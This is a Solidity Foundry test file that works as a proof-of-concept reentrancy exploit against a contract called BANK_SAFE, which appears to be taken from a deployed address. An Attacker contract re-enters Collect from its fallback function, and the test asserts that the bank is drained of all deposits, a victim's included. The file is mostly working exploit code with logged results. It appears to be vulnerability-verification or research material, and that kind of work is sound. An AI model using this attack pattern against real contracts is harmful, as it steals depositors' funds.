// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x561eac93c92360949ab1f1403323e6db345cbf31.sol";

contract Attacker {
    BANK_SAFE public bank;
    uint attackDepth;
    uint attackAmount;

    constructor(BANK_SAFE _bank) payable {
        bank = _bank;
    }

    function attack(uint _amount) public payable {
        attackAmount = _amount;
        attackDepth = 0;
        bank.Collect(_amount);
    }

    fallback() external payable {
        if (attackDepth < 1 && bank.MinSum() <= address(bank).balance) {
            attackDepth++;
            bank.Collect(attackAmount);
        }
    }

    function deposit() public payable {
        bank.Deposit{value: msg.value}();
    }
}

contract BANK_SAFEReentrancyTest is Test {
    BANK_SAFE public bank;
    LogFile public logFile;
    Attacker public attacker;
    address victim;
    
    function setUp() public {
        logFile = new LogFile();
        bank = new BANK_SAFE();
        bank.SetLogFile(address(logFile));
        bank.SetMinSum(1 ether); // Using ether units
        
        // Create attacker and victim
        attacker = new Attacker(bank);
        victim = makeAddr("victim");
        
        // Fund addresses
        vm.deal(address(attacker), 2 ether);
        vm.deal(victim, 1 ether);
        
        // Setup initial deposits
        vm.startPrank(address(attacker));
        attacker.deposit{value: 1 ether}(); // Attacker deposits 1 ether
        vm.stopPrank();
        
        vm.prank(victim);
        bank.Deposit{value: 1 ether}();     // Victim deposits 1 ether
    }

    function testReentrancyAttack() public {
        uint initialBankBalance = address(bank).balance;
        uint initialAttackerBalance = address(attacker).balance;
        
        // Log pre-attack state
        console.log("--- BEFORE-Trigger ---");
        console.log("Bank ETH Balance:", initialBankBalance);
        console.log("Attacker ETH Balance:", initialAttackerBalance);
        
        // Execute attack
        console.log("--- Trigger Reentrancy Attack ---");
        vm.prank(address(attacker));
        attacker.attack(1 ether);
        
        // Record post-attack state
        uint finalBankBalance = address(bank).balance;
        uint finalAttackerBalance = address(attacker).balance;
        
        console.log("--- AFTER-Trigger ---");
        console.log("Bank ETH Balance:", finalBankBalance);
        console.log("Attacker ETH Balance:", finalAttackerBalance);
        
        // Differential verification
        bool bankDrained = (finalBankBalance == 0);
        bool attackerGained = (finalAttackerBalance == initialAttackerBalance + initialBankBalance);
        bool vulnerabilityExists = bankDrained && attackerGained;
        
        // Differential verdict
        if (vulnerabilityExists) {
            console.log("Verdict: State changed - Reentrancy vulnerability exploited");
        } else {
            console.log("Verdict: No state change - Reentrancy attack failed");
        }
        
        // Final vulnerability verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Successful reentrancy attack drained bank funds");
        } else {
            console.log("Vulnerability not Exist: Failed to exploit reentrancy vulnerability");
        }

        // Verify bank drained and attacker received funds
        assertEq(finalBankBalance, 0, "Bank should be drained");
        assertEq(
            finalAttackerBalance,
            initialAttackerBalance + initialBankBalance,
            "Attacker should receive all funds"
        );
    }
}